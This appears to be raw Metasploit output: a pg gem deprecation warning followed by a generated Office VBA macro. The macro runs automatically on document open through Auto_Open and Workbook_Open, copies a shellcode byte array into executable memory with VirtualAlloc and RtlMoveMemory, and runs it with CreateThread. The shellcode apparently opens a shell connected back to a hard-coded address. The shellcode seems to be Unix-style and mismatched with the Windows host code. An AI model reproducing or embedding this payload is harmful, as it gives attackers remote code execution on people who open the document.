-----------------------------------------------------------------------------------
The pg and/or activerecord gem version has changed, meaning deprecated pg constants
may no longer be in use, so try deleting this file to see if the
'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
/opt/metasploit-framework/embedded/framework/lib/pg/deprecated_constants.rb
-----------------------------------------------------------------------------------

#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Hwyjmqen As Long, ByVal Vfbsrqrv As Long, ByVal Owvkcu As LongPtr, Gnqvswyw As Long, ByVal Viawp As Long, Qxd As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Knskwdbnt As Long, ByVal Ydz As Long, ByVal Sgntjcpk As Long, ByVal Jrml As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Vzfykiuc As LongPtr, ByRef Hogpmgt As Any, ByVal Hrae As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Hwyjmqen As Long, ByVal Vfbsrqrv As Long, ByVal Owvkcu As Long, Gnqvswyw As Long, ByVal Viawp As Long, Qxd As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Knskwdbnt As Long, ByVal Ydz As Long, ByVal Sgntjcpk As Long, ByVal Jrml As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Vzfykiuc As Long, ByRef Hogpmgt As Any, ByVal Hrae As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Etgrwyjcf As Long, Pmctlcbr As Variant, Jcujr As Long
#If Vba7 Then
	Dim  Frsapkuxv As LongPtr, Epmvdhta As LongPtr
#Else
	Dim  Frsapkuxv As Long, Epmvdhta As Long
#EndIf
	Pmctlcbr = Array(192,168,230,7,104,255,2,12,61,137,231,49,192,80,106,1,106,2,106,16,176,97,205,128,87,80,80,106,98,88,205,128,80,106,90,88,205,128,255,79,232,121,246,104,47,47,115,104,104,47,98,105,110,137,227,80,84,84,83,80,176,59,205,128)

	Frsapkuxv = VirtualAlloc(0, UBound(Pmctlcbr), &H1000, &H40)
	For Jcujr = LBound(Pmctlcbr) To UBound(Pmctlcbr)
		Etgrwyjcf = Pmctlcbr(Jcujr)
		Epmvdhta = RtlMoveMemory(Frsapkuxv + Jcujr, Etgrwyjcf, 1)
	Next Jcujr
	Epmvdhta = CreateThread(0, 0, Frsapkuxv, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

